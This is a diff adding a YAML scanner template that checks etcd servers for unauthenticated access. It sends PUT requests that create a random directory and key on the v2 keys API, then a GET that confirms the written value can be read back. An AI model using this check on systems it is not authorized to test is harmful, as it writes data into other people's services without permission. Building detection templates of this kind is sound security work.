@@ -1,0 +1,29 @@
+name: poc-yaml-etcd-unauth
+set:
+  r1: randomLowercase(32)
+  r2: randomLowercase(32)
+  r3: randomLowercase(32)
+rules:
+  - method: PUT
+    path: /v2/keys/{{r1}}?dir=true
+    follow_redirects: false
+    expression: |
+      response.status == 201
+  - method: PUT
+    path: /v2/keys/{{r1}}/{{r2}}?prevExist=false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: value={{r3}}
+    follow_redirects: false
+    expression: |
+      response.status == 201
+  - method: GET
+    path: /v2/keys/{{r1}}/{{r2}}?quorum=false&recursive=false&sorted=false
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(r3))
+
+detail:
+  author: j4ckzh0u(https://github.com/j4ckzh0u)
+  links:
+    - https://www.freebuf.com/news/196993.html
